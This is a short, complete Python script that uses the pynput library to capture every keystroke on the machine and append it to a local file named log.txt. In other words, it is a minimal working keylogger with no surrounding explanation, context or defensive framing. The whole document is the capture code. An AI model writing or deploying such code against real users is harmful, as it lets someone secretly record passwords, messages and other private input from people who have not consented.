from pynput.keyboard import Listener

def write_to_file(key):
    key_data = str(key)
    with open("log.txt","a") as key:
        key.write(key_data)

with Listener(on_press= write_to_file) as listen:
    listen.join()